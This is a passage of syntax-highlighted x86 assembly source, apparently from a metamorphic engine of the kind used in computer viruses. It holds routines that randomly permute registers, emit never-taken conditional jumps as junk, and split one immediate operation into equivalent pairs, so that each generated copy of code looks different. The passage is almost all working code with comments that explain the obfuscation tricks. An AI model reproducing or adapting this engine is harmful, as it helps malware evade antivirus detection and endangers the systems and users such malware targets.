                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X008_11</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetWeight</span><span class="sc0">
       </span><span class="sc5">@@ReadWeightIdent3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X012_15</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetWeight</span><span class="sc0">
       </span><span class="sc5">@@ReadWeightIdent4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X016_19</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">@@SetWeight</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_MakeSET_WEIGHT</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;;; ------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">

</span><span class="sc1">;; Now these are helper functions. They are used from other parts of the</span><span class="sc0">
</span><span class="sc1">;; engine, not only by the expander.</span><span class="sc0">
</span><span class="sc1">;; This function is an optimization of how we cam make in little code a</span><span class="sc0">
</span><span class="sc1">;; permutation of three registers in a way that every possible combination</span><span class="sc0">
</span><span class="sc1">;; is present, and moreover all them have the same probability of appear.</span><span class="sc0">
</span><span class="sc1">;; The theory is that there are 6 possible permutations for a set of three</span><span class="sc0">
</span><span class="sc1">;; values (in this case EBX, ECX and EDX). Then, following the code, you'll</span><span class="sc0">
</span><span class="sc1">;; see that the permutation is made by:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 1) Randomly decide if goto 3)</span><span class="sc0">
</span><span class="sc1">;; 2) Exchange 1st and 2nd OR Exchange 1st and 3rd (always)</span><span class="sc0">
</span><span class="sc1">;; 3) Decide if we exchange 2nd and 3rd. Do it or not.</span><span class="sc0">
</span><span class="sc5">Xp_GarbleRegisters</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Xp_GarbleRegisters</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Permutation0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Permutation1</span><span class="sc0">
    </span><span class="sc5">@@Permutation2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; XCHG EBX,EDX</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Permutation0</span><span class="sc0">
    </span><span class="sc5">@@Permutation1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; XCHG EBX,ECX</span><span class="sc0">
    </span><span class="sc5">@@Permutation0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">
    </span><span class="sc5">@@Permutation0_0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; XCHG ECX,EDX</span><span class="sc0">
    </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_GarbleRegisters</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Get an special conditional jump. The jump obtained here is specially</span><span class="sc0">
</span><span class="sc1">;; selected to be used for CMP Reg,Reg/Jcc @x pairs. The direct result from</span><span class="sc0">
</span><span class="sc1">;; this instruction will make that the conditional jump never occurs, while</span><span class="sc0">
</span><span class="sc1">;; if we inverse the bit 0 of the Jcc returned we'll make that the Jcc</span><span class="sc0">
</span><span class="sc1">;; always jump.</span><span class="sc0">
</span><span class="sc1">;; The algorithm here is a hard optimization to select one of that types of</span><span class="sc0">
</span><span class="sc1">;; jumps. The jumps that act like a NOP are JO/JB/JNZ/JA/JS/JNP/JL/JG, while</span><span class="sc0">
</span><span class="sc1">;; the ones that always jump are JNO/JAE/JZ/JBE/JNS/JP/JGE/JLE. We are going</span><span class="sc0">
</span><span class="sc1">;; to use only the NOP ones. The opcodes in number are:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 70,72,75,77,78,7B,7C,7F</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; So these are the only values we can return. We pass them to binary (only</span><span class="sc0">
</span><span class="sc1">;; the low nibble):</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 0000,0010,0101,0111,1000,1011,1100,1111</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; And we see that the values are repeated in a certain way. Let's join them</span><span class="sc0">
</span><span class="sc1">;; in groups:</span><span class="sc0">
</span><span class="sc1">;; 0000   1000         0 00 0     1 00 0</span><span class="sc0">
</span><span class="sc1">;; 0010   1011         0 01 0     1 01 1</span><span class="sc0">
</span><span class="sc1">;; 0101   1100   --&gt;   0 10 1     1 10 0</span><span class="sc0">
</span><span class="sc1">;; 0111   1111         0 11 1     1 11 1</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The numbers are the same, excepting by the high bit and the low one.</span><span class="sc0">
</span><span class="sc1">;; Now, just notice that when the high bit is clear the lowest bit is the</span><span class="sc0">
</span><span class="sc1">;; same than the bit 2, and when the high bit is set the lowest bit is equal</span><span class="sc0">
</span><span class="sc1">;; to the bit 1. Then, what we do is to copy the bit 2 or 1 to the bit 0</span><span class="sc0">
</span><span class="sc1">;; depending if bit 3 is 0 or 1. Just what we do below.</span><span class="sc0">
</span><span class="sc5">Xp_GetSpecialJcc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Copy the random in EBX</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">  </span><span class="sc1">; Get a random number from 00 to 0E (even)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; High bit active?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Next</span><span class="sc0">      </span><span class="sc1">; Then only shift EBX once</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc5">@@Next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Get the resulting last bit</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; Add it to the random from 00 to 0E</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">  </span><span class="sc1">; Convert it to Jcc</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_GetSpecialJcc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function will take the operation to perform (in an OP Reg/Mem,Imm</span><span class="sc0">
</span><span class="sc1">;; operation) and will calculate a pair of operation that do the same with</span><span class="sc0">
</span><span class="sc1">;; a new Imm value for each one. The MOV has the most variated results, and</span><span class="sc0">
</span><span class="sc1">;; there are others that can't be decomposed, such SUB.</span><span class="sc0">
</span><span class="sc1">;; The decomposition is done in the following way for every case. I had to</span><span class="sc0">
</span><span class="sc1">;; deduce each formula (concretely for OR and AND) from scratch, so maybe</span><span class="sc0">
</span><span class="sc1">;; there are others better, but I didn't find them. Maybe the formulas</span><span class="sc0">
</span><span class="sc1">;; below aren't correct: that's because I coded it, optimize it, and I didn't</span><span class="sc0">
</span><span class="sc1">;; remember to write down the process, so I have to re-deduce them :).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Taking Rnd1, Rnd2 as random numbers, and Imm as the destiny value:</span><span class="sc0">
</span><span class="sc1">;; MOV:</span><span class="sc0">
</span><span class="sc1">;;      MOV Rnd1, ADD Imm-Rnd1</span><span class="sc0">
</span><span class="sc1">;;      MOV Rnd1&amp;Imm, OR ((Rnd2 &amp; Imm)^(Rnd1 &amp; Imm))|(Rnd2 &amp; Imm)</span><span class="sc0">
</span><span class="sc1">;;      MOV (Rnd2 &amp; NOT(Rnd1))|Imm, AND (Rnd1 | Imm)  (1)</span><span class="sc0">
</span><span class="sc1">;;      MOV NOT(Rnd1)|Imm, AND Rnd1|Imm               (2)</span><span class="sc0">
</span><span class="sc1">;;      MOV Rnd1, XOR Rnd1^Imm</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; ADD:</span><span class="sc0">
</span><span class="sc1">;;      ADD Rnd1, ADD Imm-Rnd1</span><span class="sc0">
</span><span class="sc1">;; OR:</span><span class="sc0">
</span><span class="sc1">;;      OR Rnd1&amp;Imm, OR ((Rnd1&amp;Imm)^Imm)|(Imm&amp;Rnd2)</span><span class="sc0">
</span><span class="sc1">;; AND:</span><span class="sc0">
</span><span class="sc1">;;      AND Imm|Rnd1, AND Imm|NOT(Rnd1)</span><span class="sc0">
</span><span class="sc1">;; XOR:</span><span class="sc0">
</span><span class="sc1">;;      XOR Rnd1, XOR Imm^Rnd1</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">Xp_MakeComposedOPImm</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Get a random number in EBX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the Imm in EDX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_ADD</span><span class="sc0">       </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_OR</span><span class="sc0">        </span><span class="sc1">; OR?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_AND</span><span class="sc0">       </span><span class="sc1">; AND?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_XOR</span><span class="sc0">       </span><span class="sc1">; XOR?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Return_Error</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_MOV_ADD</span><span class="sc0">   </span><span class="sc1">; MOV + ADD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_MOV_OR</span><span class="sc0">    </span><span class="sc1">; MOV + OR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_MOV_AND</span><span class="sc0">   </span><span class="sc1">; MOV + AND</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_MOV_XOR</span><span class="sc0">   </span><span class="sc1">; MOV + XOR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_OP_MOV</span><span class="sc0">       </span><span class="sc1">; MOV only</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_MOV_MOV_MakeReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return_NoError</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_MOV_MakeReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return_NoError</span><span class="sc0">

   </span><span class="sc5">@@Double_OP_MOV_ADD</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Calculate the two Imms for</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; MOV + ADD</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_MOV_OP</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_OR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; Calculate the two Imms for</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">              </span><span class="sc1">; MOV + OR</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_MOV_OP</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_AND</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">         </span><span class="sc1">; Calculate the two Imms for</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; MOV + AND (two different</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_MOV_AND_2</span><span class="sc0">   </span><span class="sc1">; methods)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_MOV_OP</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_AND_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_MOV_OP</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_XOR</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Calculate the two Imms for XOR</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_OP</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Make the two instructions:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">            </span><span class="sc1">; Generate a MOV Reg/Mem,Imm1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_MOV_OP_MakeReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; Generate an OP Mem,Imm2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return_NoError</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_MOV_OP_MakeReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; Generate an OP Reg,Imm2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
